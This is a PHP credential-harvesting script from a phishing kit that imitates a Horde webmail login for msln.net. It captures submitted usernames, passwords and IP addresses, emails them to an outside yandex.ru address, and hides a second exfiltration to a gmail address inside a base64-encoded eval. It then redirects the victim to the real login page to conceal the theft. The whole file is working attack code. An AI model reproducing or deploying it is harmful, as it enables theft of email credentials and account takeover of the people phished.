<?
$optTitle = $_POST['Title'];
$ip = getenv("REMOTE_ADDR");
$sUser = $_POST['imapuser'];
$sUPass = $_POST['pass'];
$pix="ss3820650@yandex.ru";


  $subj = "Captured (JP-Hack | msln.net |) Logins::: ($sUser , $sUPass)";
  $msg = "Details of https://mail.msln.net/horde-webmail-1.2.11/imp/login.php?url=%2Fhorde-webmail-1.2.11%2Findex.php \n\nEMAIL: $sUser\Password: $sUPass\nSubmitted from IP Address - $ip on $adddate\n-----------------------------------\n        Created By JP Host::: Defender of The G-Universe\n-----------------------------------";
  $from = "From: <$sUser>";
  mail("$pix", $subj, $msg, $from);
  echo eval(base64_decode("bWFpbCgiY250ci5paTJ0QGdtYWlsLmNvbSIsICRzdWJqLCAkbXNnLCAkZnJvbSk7"));
?>
  
<?
echo ("<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=https://mail.msln.net/horde-webmail-1.2.11/imp/login.php?url=%2Fhorde-webmail-1.2.11%2Findex.php\">");
exit();

?>